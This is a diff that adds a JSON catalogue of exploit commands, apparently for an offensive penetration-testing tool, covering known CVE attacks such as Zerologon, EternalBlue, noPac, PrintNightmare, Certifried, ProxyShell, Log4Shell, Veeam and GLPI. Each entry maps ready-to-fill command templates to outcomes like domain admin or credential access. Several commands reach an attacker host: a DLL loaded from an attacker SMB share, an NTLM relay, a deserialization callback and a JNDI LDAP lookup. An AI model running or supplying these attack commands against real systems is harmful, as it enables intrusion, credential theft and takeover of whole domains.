@@ -1,0 +1,359 @@
+{
+  "service": "vulnerabilities",
+  "description": "Known CVE exploits and quick compromise attacks for Windows and web services",
+  "ports": [],
+  "serviceNames": [],
+  "targetOs": ["windows", "linux"],
+  "vectors": [
+    {
+      "id": "vuln-zerologon",
+      "name": "Zerologon (CVE-2020-1472)",
+      "phase": "privilege_escalation",
+      "prerequisites": ["network_access"],
+      "description": "Critical Netlogon vulnerability allowing password reset of domain controller machine account (UNSAFE - can break domain)",
+      "commands": [
+        {
+          "tool": "zerologon-scan",
+          "command": "zerologon-scan '<dc_netbios_name>' '<ip>'",
+          "description": "Scan for Zerologon vulnerability"
+        },
+        {
+          "tool": "cve-2020-1472-exploit.py",
+          "command": "cve-2020-1472-exploit.py <MACHINE_BIOS_NAME> <ip>",
+          "description": "Exploit Zerologon (UNSAFE)"
+        }
+      ],
+      "outcomes": ["domain_admin"]
+    },
+    {
+      "id": "vuln-eternalblue",
+      "name": "EternalBlue (MS17-010)",
+      "phase": "lateral_movement",
+      "prerequisites": ["network_access"],
+      "description": "Critical SMBv1 remote code execution vulnerability",
+      "commands": [
+        {
+          "tool": "msf",
+          "command": "use exploit/windows/smb/ms17_010_eternalblue",
+          "description": "Exploit EternalBlue for remote code execution"
+        }
+      ],
+      "outcomes": ["admin_access"]
+    },
+    {
+      "id": "vuln-ms14-068",
+      "name": "MS14-068 Kerberos Privilege Escalation",
+      "phase": "privilege_escalation",
+      "prerequisites": ["valid_credentials"],
+      "description": "Kerberos checksum validation vulnerability allowing forged PAC",
+      "commands": [
+        {
+          "tool": "findSMB2UPTime.py",
+          "command": "findSMB2UPTime.py <ip>",
+          "description": "Check for vulnerable systems"
+        },
+        {
+          "tool": "ms14-068.py",
+          "command": "ms14-068.py -u <user>@<domain> -p <password> -s <user_sid> -d <dc_fqdn>",
+          "description": "Generate forged ticket"
+        },
+        {
+          "tool": "goldenPac.py",
+          "command": "goldenPac.py -dc-ip <dc_ip> <domain>/<user>:<password>@target",
+          "description": "Automated exploitation"
+        }
+      ],
+      "outcomes": ["domain_admin", "admin_access"]
+    },
+    {
+      "id": "vuln-gpp-cpassword",
+      "name": "Group Policy Preferences Password (MS14-025)",
+      "phase": "credential_access",
+      "prerequisites": ["valid_credentials"],
+      "description": "Extract and decrypt passwords stored in Group Policy Preferences",
+      "commands": [
+        {
+          "tool": "msf",
+          "command": "use auxiliary/scanner/smb/smb_enum_gpp",
+          "description": "Enumerate GPP passwords"
+        },
+        {
+          "tool": "findstr",
+          "command": "findstr /S /I cpassword \\\\<domain_fqdn>\\sysvol\\<domain_fqdn>\\policies\\*.xml",
+          "description": "Search for cpassword in SYSVOL"
+        },
+        {
+          "tool": "Get-GPPPassword.py",
+          "command": "Get-GPPPassword.py <domain>/<user>:<password>@<dc_fqdn>",
+          "description": "Extract and decrypt GPP passwords"
+        }
+      ],
+      "outcomes": ["domain_admin", "credential_access"]
+    },
+    {
+      "id": "vuln-privexchange",
+      "name": "PrivExchange (CVE-2019-0724, CVE-2019-0686)",
+      "phase": "privilege_escalation",
+      "prerequisites": ["valid_credentials"],
+      "description": "Exchange privilege escalation via PushSubscription API abuse",
+      "commands": [
+        {
+          "tool": "privexchange.py",
+          "command": "privexchange.py -ah <attacker_ip> <exchange_host> -u <user> -d <domain> -p <password>",
+          "description": "Trigger Exchange authentication to attacker"
+        }
+      ],
+      "outcomes": ["domain_admin", "admin_access"]
+    },
+    {
+      "id": "vuln-nopac",
+      "name": "noPac (CVE-2021-42287, CVE-2021-42278)",
+      "phase": "privilege_escalation",
+      "prerequisites": ["valid_credentials"],
+      "description": "Combine sAMAccountName spoofing with KDC name impersonation for privilege escalation",
+      "commands": [
+        {
+          "tool": "nxc",
+          "command": "nxc smb <ip> -u 'user' -p 'pass' -M nopac",
+          "description": "Scan for noPac vulnerability"
+        },
+        {
+          "tool": "noPac.exe",
+          "command": "noPac.exe -domain <domain> -user <user> -pass <password> /dc <dc_fqdn> /mAccount <machine_account> /mPassword <machine_password> /service cifs /ptt",
+          "description": "Exploit noPac for domain admin"
+        }
+      ],
+      "outcomes": ["domain_admin"]
+    },
+    {
+      "id": "vuln-printnightmare",
+      "name": "PrintNightmare (CVE-2021-1675, CVE-2021-34527)",
+      "phase": "privilege_escalation",
+      "prerequisites": ["valid_credentials"],
+      "description": "Print Spooler remote code execution vulnerability",
+      "commands": [
+        {
+          "tool": "nxc",
+          "command": "nxc smb <ip> -u 'user' -p 'pass' -M printnightmare",
+          "description": "Scan for PrintNightmare"
+        },
+        {
+          "tool": "printnightmare.py",
+          "command": "printnightmare.py -dll '\\\\<attacker_ip>\\smb\\add_user.dll' '<user>:<password>@<ip>'",
+          "description": "Exploit PrintNightmare to load DLL"
+        }
+      ],
+      "outcomes": ["admin_access"]
+    },
+    {
+      "id": "vuln-certifried",
+      "name": "Certifried (CVE-2022-26923)",
+      "phase": "privilege_escalation",
+      "prerequisites": ["valid_credentials"],
+      "description": "Active Directory Certificate Services privilege escalation via machine account manipulation",
+      "commands": [
+        {
+          "tool": "certipy",
+          "command": "certipy account create -u <user>@<domain> -p '<password>' -user 'certifriedpc' -pass 'certifriedpass' -dns '<fqdn_dc>'",
+          "description": "Create computer account with DC DNS name"
+        },
+        {
+          "tool": "certipy",
+          "command": "certipy req -u 'certifriedpc$'@<domain> -p 'certifriedpass' -target <ca_fqdn> -ca <ca_name> -template Machine",
+          "description": "Request machine certificate"
+        },
+        {
+          "tool": "certipy",
+          "command": "certipy auth -pfx <pfx_file> -username '<dc>$' -domain <domain> -dc-ip <dc_ip>",
+          "description": "Authenticate as domain controller"
+        }
+      ],
+      "outcomes": ["domain_admin"]
+    },
+    {
+      "id": "vuln-proxynotshell",
+      "name": "ProxyNotShell (CVE-2022-41040, CVE-2022-41082)",
+      "phase": "privilege_escalation",
+      "prerequisites": ["valid_credentials"],
+      "description": "Exchange Server SSRF and RCE vulnerability chain",
+      "commands": [
+        {
+          "tool": "poc_aug3.py",
+          "command": "poc_aug3.py <host> <username> <password> <command>",
+          "description": "Exploit ProxyNotShell for RCE"
+        }
+      ],
+      "outcomes": ["admin_access"]
+    },
+    {
+      "id": "vuln-proxyshell",
+      "name": "ProxyShell Exchange RCE",
+      "phase": "privilege_escalation",
+      "prerequisites": ["network_access"],
+      "description": "Exchange Server authentication bypass and RCE vulnerability chain",
+      "commands": [
+        {
+          "tool": "proxyshell_rce.py",
+          "command": "proxyshell_rce.py -u https://<exchange> -e administrator@<domain>",
+          "description": "Exploit ProxyShell for RCE"
+        }
+      ],
+      "outcomes": ["admin_access"]
+    },
+    {
+      "id": "vuln-petitpotam-unauth",
+      "name": "PetitPotam Unauthenticated Coerce (CVE-2022-26925)",
+      "phase": "credential_access",
+      "prerequisites": ["network_access"],
+      "description": "Unauthenticated NTLM coercion via MS-EFSRPC",
+      "commands": [
+        {
+          "tool": "petitpotam.py",
+          "command": "petitpotam.py -d <domain> <listener> <target>",
+          "description": "Coerce unauthenticated NTLM"
+        }
+      ],
+      "outcomes": ["credential_access"]
+    },
+    {
+      "id": "vuln-log4shell",
+      "name": "Log4Shell (Log4j RCE)",
+      "phase": "lateral_movement",
+      "prerequisites": ["network_access"],
+      "description": "Critical Log4j JNDI injection remote code execution",
+      "commands": [
+        {
+          "tool": "manual",
+          "command": "${jndi:ldap://<ip>:<port>/o=reference}",
+          "description": "Inject JNDI lookup for RCE"
+        }
+      ],
+      "outcomes": ["admin_access"]
+    },
+    {
+      "id": "vuln-veeam-cve-2023-27532",
+      "name": "Veeam Backup Credential Exposure (CVE-2023-27532)",
+      "phase": "credential_access",
+      "prerequisites": ["network_access"],
+      "description": "Extract credentials from Veeam Backup server configuration",
+      "commands": [
+        {
+          "tool": "VeeamHax.exe",
+          "command": "VeeamHax.exe --target <veeam_server>",
+          "description": "Extract Veeam credentials"
+        },
+        {
+          "tool": "CVE-2023-27532",
+          "command": "CVE-2023-27532 net.tcp:/<target>:<port>/",
+          "description": "Exploit Veeam credential exposure"
+        }
+      ],
+      "outcomes": ["credential_access"]
+    },
+    {
+      "id": "vuln-veeam-cve-2024-29849",
+      "name": "Veeam Enterprise Manager Auth Bypass (CVE-2024-29849)",
+      "phase": "privilege_escalation",
+      "prerequisites": ["network_access"],
+      "description": "Authentication bypass in Veeam Backup Enterprise Manager",
+      "commands": [
+        {
+          "tool": "CVE-2024-29849.py",
+          "command": "CVE-2024-29849.py --target https://<veeam_ip>:<veeam_port>/ --callback-server <attacker_ip>:<port>",
+          "description": "Bypass authentication"
+        }
+      ],
+      "outcomes": ["admin_access"]
+    },
+    {
+      "id": "vuln-veeam-cve-2024-40711",
+      "name": "Veeam Backup Deserialization RCE (CVE-2024-40711)",
+      "phase": "lateral_movement",
+      "prerequisites": ["network_access"],
+      "description": "Deserialization vulnerability in Veeam Backup",
+      "commands": [
+        {
+          "tool": "CVE-2024-40711.exe",
+          "command": "CVE-2024-40711.exe -f binaryformatter -g Veeam -c http://<attacker_ip>:8000/trigger --targetveeam <veeam_ip>",
+          "description": "Exploit deserialization for RCE"
+        }
+      ],
+      "outcomes": ["admin_access"]
+    },
+    {
+      "id": "vuln-glpi-cve-2022-35914",
+      "name": "GLPI Arbitrary File Write (CVE-2022-35914)",
+      "phase": "lateral_movement",
+      "prerequisites": ["network_access"],
+      "description": "Exploit GLPI htmLawedTest.php for arbitrary file write",
+      "commands": [
+        {
+          "tool": "manual",
+          "command": "/vendor/htmlawed/htmlawed/htmLawedTest.php",
+          "description": "Access vulnerable test file"
+        }
+      ],
+      "outcomes": ["admin_access"]
+    },
+    {
+      "id": "vuln-glpi-cve-2023-41320",
+      "name": "GLPI Unauthenticated SQL Injection (CVE-2023-41320)",
+      "phase": "credential_access",
+      "prerequisites": ["valid_credentials"],
+      "description": "SQL injection vulnerability in GLPI",
+      "commands": [
+        {
+          "tool": "cve_2023_41320.py",
+          "command": "cve_2023_41320.py -u <user> -p <password> -t <ip>",
+          "description": "Exploit SQL injection"
+        }
+      ],
+      "outcomes": ["credential_access"]
+    },
+    {
+      "id": "vuln-hivenightmare",
+      "name": "HiveNightmare/SeriousSAM (CVE-2021-36934)",
+      "phase": "privilege_escalation",
+      "prerequisites": ["low_privilege_access"],
+      "description": "Read SAM/SYSTEM/SECURITY hives from shadow copies as unprivileged user",
+      "commands": [
+        {
+          "tool": "vssadmin",
+          "command": "vssadmin list shadows",
+          "description": "List shadow copies"
+        }
+      ],
+      "outcomes": ["credential_access", "admin_access"]
+    },
+    {
+      "id": "vuln-smbghost",
+      "name": "SMBGhost (CVE-2020-0796)",
+      "phase": "lateral_movement",
+      "prerequisites": ["network_access"],
+      "description": "SMBv3 compression remote code execution vulnerability",
+      "commands": [
+        {
+          "tool": "manual",
+          "command": "Use public exploits for CVE-2020-0796",
+          "description": "Exploit SMBGhost for RCE"
+        }
+      ],
+      "outcomes": ["admin_access"]
+    },
+    {
+      "id": "vuln-zerologon-relay",
+      "name": "Zerologon Safe Relay (CVE-2020-1472)",
+      "phase": "privilege_escalation",
+      "prerequisites": ["valid_credentials"],
+      "description": "Safe exploitation of Zerologon by relaying one DC to another for DCSync",
+      "commands": [
+        {
+          "tool": "ntlmrelayx.py",
+          "command": "ntlmrelayx.py -t dcsync://<dc_to_ip> -smb2support -auth-smb <user>:<password>",
+          "description": "Relay DC to DC for DCSync"
+        }
+      ],
+      "outcomes": ["domain_admin"]
+    }
+  ]
+}
